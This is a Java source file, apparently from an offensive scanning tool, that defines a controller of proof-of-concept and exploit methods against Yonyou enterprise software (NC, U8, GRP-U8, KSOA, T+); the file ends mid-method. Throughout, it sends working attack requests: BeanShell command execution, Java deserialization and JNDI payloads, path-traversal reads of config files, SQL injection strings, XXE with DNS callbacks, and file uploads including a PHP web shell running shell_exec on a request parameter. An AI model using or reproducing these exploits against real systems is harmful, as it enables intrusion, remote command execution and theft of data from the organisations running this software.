package com.achuna33.Controllers;

import java.io.*;
import java.net.MalformedURLException;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import com.achuna33.Gadgets.URLDNS;
import com.achuna33.SupportType.Poc_Exp;
import com.achuna33.SupportType.SupportVul;
import com.achuna33.UI.UIController;
import com.achuna33.Utils.*;
import nc.bs.framework.common.InvocationInfo;
import nc.bs.framework.comn.NetObjectOutputStream;
import nc.bs.framework.comn.cli.JavaURLCommunicator;


@BasicMapping(uri = "用友")
public class YongyouController extends Controller implements BasicController{
    public YongyouController(){

    }

    @VulnerabilityDescriptionMapping(Description="servlet/~ic/bsh.servlet.BshServlet 可以执行脚本。" ,SupportVulType= SupportVul.RuntimeExec)
    public void vul_Beanshell(Poc_Exp type,String target,Object... args) throws Exception {
        WriteLog("\n[*]开始检测：  vul_Beanshell");

        switch (type){
            case EXP:
                break;
            case POC:
               HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Post("bsh.script=exec(\"ipconfig\");");
                if(result.responseBody.contains("DNS")){
                    WriteLog("[*] 存在漏洞");
                }else {
                    WriteLog("[*] 不存在漏洞");
                }
                WriteLog("\n"+result.responseBody);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Serial)
    public void vul_ResourceManagerServlet(Poc_Exp type,String target,Object... args) throws Exception {

        WriteLog("\n[*]开始检测：vul_ResourceManagerServlet");
        switch (type){
            case EXP:
                String text = "";
                if (args!=null){
                    text = (String) args[0];
                    SerializedDataController serializedDataController = new SerializedDataController();
                    serializedDataController.process(text);
                    byte[] obj = serializedDataController.getResult(text);

                    target = target+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";
                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.addHeaders("Content-Type","");
                    httpRequest.Post(obj);
                    WriteExpLog("\n[*] 发送成功。");

                }else {
                    WriteExpLog("\n[*] 请输入利用链");
                    return;
                }
                break;
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("\n[*] DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                Object object = URLDNS.getObject("http://"+domain);

                target = target+"/servlet/~ic/uap.framework.rc.controller.ResourceManagerServlet";
                HttpRequest httpRequest = new HttpRequest(target);
                httpRequest.addHeaders("Content-Type","");
                httpRequest.Post(object);

                WriteLog("\n[*]请自行判断是否成功。"+domain);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Serial)
    public void vul_XbrlPersistenceServlet(Poc_Exp type,String target,Object... args) throws Exception {
        WriteLog("\n[*]开始检测：  vul_XbrlPersistenceServlet");
        switch (type){
            case EXP:
                String text = "";
                if (args!=null){
                    text = (String) args[0];
                    SerializedDataController serializedDataController = new SerializedDataController();
                    serializedDataController.process(text);
                    byte[] obj = serializedDataController.getResult(text);

                    target = target+"/servlet/~xbrl/XbrlPersistenceServlet";
                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.addHeaders("Content-Type","");
                    httpRequest.Post(obj);
                    WriteExpLog("\n[*] 发送成功。");

                }else {
                    WriteExpLog("\n[*] 请输入利用链");
                    return;
                }
                break;
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("[*]DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                Object object = URLDNS.getObject("http://"+domain);

                target = target + "/service/~xbrl/XbrlPersistenceServlet";
                HttpRequest httpRequest = new HttpRequest(target);
                httpRequest.addHeaders("Content-Type","");
                httpRequest.Post(object);

                WriteLog("[*]请自行判断是否成功。"+domain);
        }
    }
    @VulnerabilityDescriptionMapping(Description="java 反序列化",SupportVulType= SupportVul.Jndi)
    public void vul_LoginJndi(Poc_Exp type,String target,Object... args){
        WriteLog("\n[*]开始检测： vul_LoginJndi POC需要配置DNS");
        switch (type) {
            case EXP:
                try {
                    WriteExpLog ("\n[*]开始检测： vul_LoginJndi EXP");
                    WriteExpLog ("\n[*]Demo： ldap://127.0.0.1/");
                    InvocationInfo info = new InvocationInfo();
                    info.setServiceName(((String) args[0]).trim());


                    target = target + "/ServiceDispatcherServlet";

                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.addHeaders("serverEnable","localserver");
                    ByteArrayOutputStream bout = new ByteArrayOutputStream();
                    NetObjectOutputStream objOut = new NetObjectOutputStream(bout);
                    objOut.writeObject(info);
                    objOut.finish();
                    objOut.flush();

                    httpRequest.Post(bout);
                    WriteExpLog("\n[*] 请自行判断是否成功。");

                }catch (Exception e){
                    WriteExpLog("\n[*] 请自行判断是否成功。");
                }
                break;
            case POC:
                try {
                    if (Cache.uiController.DNSDomain.getText().equals("")){
                        WriteLog("[*]  DNS验证类型漏洞 请配置 DNSLOG 地址");
                        return;
                    }else {
                        DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                    }
                    InvocationInfo info = new InvocationInfo();

                    String domain = DNSLOG.getRandomDomain();
                    info.setServiceName("ldap://"+domain);
                    JavaURLCommunicator com = new JavaURLCommunicator();
                    target = target + "/ServiceDispatcherServlet";

                    HttpRequest httpRequest = new HttpRequest(target);
                    httpRequest.addHeaders("serverEnable","localserver");
                    ByteArrayOutputStream bout = new ByteArrayOutputStream();
                    NetObjectOutputStream objOut = new NetObjectOutputStream(bout);
                    objOut.writeObject(info);
                    objOut.finish();
                    objOut.flush();

                    httpRequest.Post(bout);
                    WriteLog("[*]请自行判断是否成功。"+domain);

                }catch (Exception e){
                }
        }

    }
    @VulnerabilityDescriptionMapping(Description="用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞",SupportVulType= SupportVul.信息泄露)
    public void vul_getSessionList(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 OA getSessionList.jsp 敏感信息泄漏漏洞");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll");
                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/yyoa/ext/https/getSessionList.jsp?cmd=getAll");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 NC download 敏感信息泄漏漏洞",SupportVulType= SupportVul.信息泄露)
    public void vul_download(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 NC download 敏感信息泄漏漏洞");
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp");
                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/portal/pt/xml/file/download?pageId=login&filename=..%5Cindex.jsp");
                    WriteLog("\n[*]敏感数据文件：../../ierp/bin/prop.xml   ../../conf/server.xml");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 U8 OA test.jsp SQL注入漏洞",SupportVulType= SupportVul.SQLInjection)
    public void vul_testSqlInjection(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 OA test.jsp SQL注入漏洞");

        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("MD5")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20MD5(1))");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description="用友 NC NCFindWeb 任意文件读取漏洞",SupportVulType= SupportVul.SQLInjection)
    public void vul_NCFindWeb(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 NC NCFindWeb 任意文件读取漏洞");


        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("WebApp")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/NCFindWeb?service=IPreAlertConfigService&filename=WEB-INF/web.xml");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description="用友 NC bsh.servlet.BshServlet 远程命令执行漏洞",SupportVulType= SupportVul.RuntimeExec)
    public void vul_BshServlet(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n开始检测：  用友 NC bsh.servlet.BshServlet 远程命令执行漏洞");
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("BeanShell")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/servlet/~ic/bsh.servlet.BshServlet");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 NCCloud FS文件管理SQL注入",SupportVulType= SupportVul.RuntimeExec)
    public void vul_FS文件管理SQL注入(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 NCCloud FS文件管理SQL注入");
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/servlet/~ic/bsh.servlet.BshServlet");
                Response result = httpRequest.Get("");
                if(result.statusCode==200&&result.responseBody.contains("BeanShell")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/servlet/~ic/bsh.servlet.BshServlet");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞",SupportVulType= SupportVul.信息泄露)
    public void vul_templateOfTaohong_manager(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 FE协作办公平台 templateOfTaohong_manager.jsp 目录遍历漏洞");
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../");
                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/servlet/~ic/bsh.servlet.BshServlet");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description="用友 GRP-U8 Proxy SQL注入 CNNVD-201610-923",SupportVulType= SupportVul.信息泄露)
    public void vul_Proxy(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 GRP-U8 Proxy SQL注入 CNNVD-201610-923");
        String payload = "cVer=9.8.0&dp=<?xml version=\"1.0\" encoding=\"GB2312\"?><R9PACKET version=\"1\"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION> <NAME>AS_DataRequest</NAME><PARAMS><PARAM> <NAME>ProviderName</NAME><DATA format=\"text\">DataSetProviderData</DATA></PARAM><PARAM> <NAME>Data</NAME><DATA format=\"text\">select @@version</DATA></PARAM></PARAMS> </R9FUNCTION></R9PACKET>\n";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+"/Proxy");
                Response result = httpRequest.Post(payload);
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+"/Proxy");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友NC系统uapws wsdl XXE",SupportVulType = SupportVul.信息泄露)
    public void vul_Uapws_XXE(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        String url = "/uapws/service/nc.uap.oba.update.IUpdateService?xsd={{{xmlUrl}}}";
        WriteLog("\n[*]开始检测：  用友NC系统uapws wsdl XXE");
        switch (type){
            case EXP:
                break;
            case POC:
                if (Cache.uiController.DNSDomain.getText().equals("")){
                    WriteLog("[*]DNS验证类型漏洞 请配置 DNSLOG 地址");
                    return;
                }else {
                    DNSLOG.setDomain(Cache.uiController.DNSDomain.getText());
                }

                String domain = DNSLOG.getRandomDomain();
                url = url.replaceAll("xmlUrl","http://"+domain);
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if(result.statusCode==200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }
    @VulnerabilityDescriptionMapping(Description = "用友NC accept 文件上传",SupportVulType = SupportVul.信息泄露)
    public void vul_accept(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        String url = "/aim/equipmap/accept.jsp";
        WriteLog("\n[*]开始检测：  用友NC accept 文件上传");
        String data1 = "-----------------------------120466775124259350661042728135\r\n" +
                "Content-Disposition: form-data; name=\"fname\"\r\n" +
                "\n" +
                "webapps/nc_web/sqltest.jspx\r\n" +
                "-----------------------------120466775124259350661042728135\r\n" +
                "Content-Disposition: form-data; name=\"upload\"; filename=\"sqltest.jspx\"\r\n" +
                "Content-Type: images/gif\r\n" +
                "\r\n" +
                "test\r\n" +
                "-----------------------------120466775124259350661042728135--\r\n";
        switch (type){
            case EXP:

                HttpRequest httpRequest_exp = new HttpRequest(target+url);
                httpRequest_exp.addHeaders("Content-Type","multipart/form-data; boundary=----120466775124259350661042728135");
                Response result_exp = httpRequest_exp.Post(data1);

                if (result_exp.statusCode==200 && result_exp.responseBody.contains("afterUpload(1)")){
                    HttpRequest httpRequest_exp2 = new HttpRequest(target+"/sqltest.jspx");
                    Response result_exp2 = httpRequest_exp2.Get("");
                    if (result_exp2.statusCode==404){
                        WriteExpLog("\n[*] 上传成功 但是失败请手测");
                    }else {
                        WriteExpLog("\n[*] 上传成功: 请访问:"+target+"/sqltest.jspx");
                    }
                }else {
                    WriteExpLog("\n[*] 上传异常: 请设置代理查看");
                }

                break;
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if(result.statusCode==200 && result.responseBody.contains("NegativeArraySizeException")){
                    WriteLog("\n[*] 存在漏洞 漏洞页面");
                    WriteLog("\n[*]请求地址："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 NC Cloud uploadChunk 文件上传",SupportVulType = SupportVul.信息泄露)
    public void vul_uploadChunk(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        String url = "/ncchr/pm/fb/attachment/uploadChunk?fileGuid=/../../../nccloud/&chunk=1&chunks=1";
        WriteLog("\n[*]开始检测：  用友 NC Cloud uploadChunk 文件上传");
        String data1 = "-----------------------------120466775124259350661042728135\r\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"ncchr_log.jsp\"\r\n" +
                "<%out.println(\"12345678\");%>\r\n" +
                "-----------------------------120466775124259350661042728135--\r\n";
        switch (type){
            case EXP:
                break;
            case POC:
                HttpRequest httpRequest_exp = new HttpRequest(target+url);
                httpRequest_exp.addHeaders("Content-Type","multipart/form-data; boundary=----120466775124259350661042728135");
                Response result_exp = httpRequest_exp.Post(data1);
                httpRequest_exp.addHeaders("accessTokenNcc","eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyaWQiOiIxIn0.F5qVK-ZZEgu3WjlzIANk2JXwF49K5cBruYMnIOxItOQ");
                WriteLog(result_exp.responseBody);
                if (result_exp.statusCode==200 && result_exp.responseBody.contains("操作成功")){
                    WriteLog("\n[*] 上传成功: 请访问:"+target+"/nccloud/ncchr_log.jsp.jsp");
                } else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友NC / NCCloud SQL 注入 ",SupportVulType = SupportVul.SQLInjection)
    public void vul_IBapIOService(Poc_Exp type,String target,Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友NC / NCCloud SQL 注入 ");
        String url = "/uapws/service/nc.itf.bap.service.IBapIOService";
        String data = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:ibap=\"http://service.bap.itf.nc/IBapIOService\">\n" +
                "   <soapenv:Header/>\n" +
                "   <soapenv:Body>\n" +
                "      <ibap:getBapTable>\n" +
                "         <!--Zero or more repetitions:-->\n" +
                "         <ibap:stringarrayItem>DWQueue@MessageQueue</ibap:stringarrayItem>\n" +
                "      </ibap:getBapTable>\n" +
                "   </soapenv:Body>\n" +
                "</soapenv:Envelope>";
        switch (type){
            case EXP:
                WriteExpLog("\n[*] 建议手打");

                break;
            case POC:

                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                if (result.statusCode==500&&result.responseBody.contains("RuntimeException")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*]请求地址："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 U8 CRM getemaildata.php 任意文件上传漏洞",SupportVulType = com.achuna33.SupportType.SupportVul.UploadFile)
    public void vul_getemaildata(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 CRM getemaildata.php 任意文件上传漏洞");
        String url = "/ajax/getemaildata.php?DontCheckLogin=1";
        String randomStr = Utils.getRandomString(4)+".php";
        String payload = "------WebKitFormBoundarykS5RKgl8t3nwInMQ\n" +
                "Content-Disposition: form-data; name=\"file\"; filename=\"test \"\n" +
                "Content-Type: text/plain\n" +
                "\n" +
                "<?php\n" +
                "if(isset($_REQUEST['cmd'])) {\n" +
                "    $output = shell_exec($_REQUEST['cmd']);\n" +
                "    echo \"<pre>$output</pre>\";\n" +
                "}\n" +
                "?>\n" +
                "\n" +
                "------WebKitFormBoundarykS5RKgl8t3nwInMQ";
        switch (type){
            case POC:
                payload = payload.replace("test",randomStr);
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","multipart/form-data; boundary=----WebKitFormBoundarykS5RKgl8t3nwInMQ");
                Response result = httpRequest.Post(payload);

                if(result.statusCode==200 && result.responseBody.contains("tmpfile")){
                    WriteLog("\n[*] 存在漏洞");
                    String fileName = test.getFileName(result.responseBody);
                    String extractedText = test.extractTextBetweenStrings(fileName, "mht", ".tmp.mht\"}");
                    int decimalValue = Integer.parseInt(extractedText, 16);
                    int decrementedNum = decimalValue - 1;
                    String resultHex = Integer.toHexString(decrementedNum).toUpperCase();
                    WriteLog("\n[*] 访问地址："+target+"/tmpfile/upd"+resultHex+".tmp.php?cmd=whoami");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
//                WriteLog("\n[*] "+result.responseBody);
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 U8 CRM getemaildata.php 任意文件读取漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_getemaildata1(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 CRM getemaildata.php 任意文件读取漏洞");
        String url = "/ajax/getemaildata.php?DontCheckLogin=1&filePath=../version.php";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if(result.statusCode==200 && result.responseBody != ""){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }
    @VulnerabilityDescriptionMapping(Description = "用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_DownloadProxy(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 畅捷通T+ DownloadProxy.aspx 任意文件读取漏洞");
        String url = "/tplus/SM/DTS/DownloadProxy.aspx?preload=1&Path=../../web.config";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if(result.statusCode==200 && result.responseBody != ""){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问地址："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 GRP-u8 U8SMSProxy SQL堆叠注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_SMSProxy(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 GRP-u8 U8SMSProxy SQL堆叠注入漏洞");
        String url = "/U8SMSProxy?class=XXNote&id=qryyfs";
        String data = "begindate=2020-09-27&enddate=2020-10-27&search=";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                if(result.statusCode==200 && result.responseBody.contains("total")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] Sqlmap命令：sqlmap -u\""+target+url+"\" --data \"begindate=2020-09-27&enddate=2020-10-27&search=\" -p \"begindate\" --dbms mssql --batch");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 GRP-u8 info.log 日志信息泄露漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_info(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 GRP-u8 info.log 日志信息泄露漏洞");
        String url = "/logs/info.log";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Get("");
                if(result.statusCode==200 ){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 访问链接："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 UFIDA 数据库信息泄露漏洞",SupportVulType = SupportVul.信息泄露)
    public void vul_UFIDAPortalSESInitToolService(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 UFIDA 数据库信息泄露漏洞");
        String url = "/uapws/service/nc.itf.ses.inittool.PortalSESInitToolService";
        String data = "<soapenv:Envelope xmlns:soapenv=\\\"http://schemas.xmlsoap.org/soap/envelope/\\\" xmlns:por=\\\"http://inittool.ses.itf.nc/PortalSESInitToolService\\\">\\n <soapenv:Header/>\\n <soapenv:Body>\\n    <por:getDataSourceConfig/>\\n </soapenv:Body>\\n</soapenv:Envelope>";
        switch (type){
            case POC:
                String regex = "<return>(.*?)</return>";
                Pattern pattern = Pattern.compile(regex);
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                Matcher matcher = pattern.matcher(result.responseBody);
                if(result.statusCode==200 && result.responseBody.contains("<return>jdbc:")){
                    WriteLog("\n[*] 存在漏洞");
                    while (matcher.find()) {
                        WriteLog("\n[*] 数据库配置："+ matcher.group());
                    }
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 KSOA PayBill SQL注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_PayBill(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 KSOA PayBill SQL注入漏洞");
        String url = "/servlet/PayBill?caculate&_rnd=";
        String data = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?><root><name>1</name><name>1' payload;--</name><name>1</name><name>102360</name></root>";
        switch (type){
            case POC:
                data =data.replace("payload","WAITFOR DELAY '00:00:03'");
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                if(result.statusCode==200 && result.responseBody.contains("errmsg")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] Sqlmap命令：sqlmap -u\""+target+url+"\" --data \""+data+"\" --random-agent --batch");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 KSOA PayBill SQL注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_QVD_2023_13612(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 KSOA PayBill SQL注入漏洞");
        String url = "/tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanyController,Ufida.T.SM.UIP.ashx?method=CheckMutex";
        String data = "{\"accNum\": \"3'\", \"functionTag\": \"SYS0104\", \"url\": \"\"}";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                if(result.statusCode==200 && result.responseBody.contains("value")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] Sqlmap命令：sqlmap -u\""+target+url+"\" --data \""+data+"\" --random-agent --dbms mssql --hex --current-db");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 GRP-u8 U8SMSProxy SQL堆叠注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_KSOAsqli(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 GRP-u8 U8SMSProxy SQL堆叠注入漏洞");
        String[] url = {
                "/servlet/com.sksoft.v8.trans.servlet.TaskRequestServlet?unitid=1%27;WAITFOR%20DELAY%20%270:0:5%27--",
                "/servlet/imagefield?key=readimage&sImgname=password&sTablename=bbs_admin&sKeyname=id&sKeyvalue=-1%27;WAITFOR%20DELAY%20%270:0:5%27--"
        };
        switch (type){
            case POC:
                long startTime = System.currentTimeMillis();

                for (String poc : url){
                    HttpRequest httpRequest = new HttpRequest(target+poc);
                    Response result = httpRequest.Get("");
                    long elapsedTime = System.currentTimeMillis() - startTime;
                    double elapsedSeconds = elapsedTime / 1000.0;
                    if(elapsedSeconds>=5){
                        WriteLog("\n[*] 存在漏洞");
                        WriteLog("\n[*] Sqlmap命令：sqlmap -u\""+target+poc+" --batch");
                    }else {
                        WriteLog("\n[*] 不存在漏洞");
                    }
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 U8 Cloud RegisterServlet SQL注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_RegisterServletqli(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 Cloud RegisterServlet SQL注入漏洞");
        String url = "/servlet/RegisterServlet";
        String data = "usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','123456')),3,32)>0--";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                if(result.statusCode == 200 && result.responseBody.contains("e10adc3949ba59abbe56e057f20f883e")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] Sqlmap命令：sqlmap -u\""+target+url+" --data "+data+" --batch");
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 U8 CRM help任意文件读取",SupportVulType = SupportVul.信息泄露)
    public void vul_CRM_help2(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 CRM help任意文件读取");
        String url = "/pub/help2.php?key=/../../apache/php.ini";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                httpRequest.addHeaders("Content-Type","text/html; charset=utf-8");
                Response result = httpRequest.Get("");
                WriteLog(result.responseBody);
                if(result.statusCode == 200){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 请求链接："+target+url);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
            case EXP:
                break;
        }
    }

    @VulnerabilityDescriptionMapping(Description = "用友 U8 Cloud SQL注入漏洞",SupportVulType = SupportVul.SQLInjection)
    public void vul_KeyWordDetailReportQuery(Poc_Exp type, String target, Object... args) throws MalformedURLException {
        WriteLog("\n[*]开始检测：  用友 U8 Cloud SQL注入漏洞");
        String url = "/servlet/~iufo/nc.itf.iufo.mobilereport.data.KeyWordDetailReportQuery";
        String data = "{\"reportType\":\"'\",\"usercode\":\"18701014496\",\"keyword\":[{\"keywordPk\":\"1\",\"keywordValue\":\"1\",\"keywordIndex\":1}]}";
        switch (type){
            case POC:
                HttpRequest httpRequest = new HttpRequest(target+url);
                Response result = httpRequest.Post(data);
                if(result.statusCode == 200 && result.responseBody.contains("附近有语法错误")){
                    WriteLog("\n[*] 存在漏洞");
                    WriteLog("\n[*] 请求链接："+target+url);
                    WriteLog("\n[*] POST请求："+data);
                }else {
                    WriteLog("\n[*] 不存在漏洞");
                }
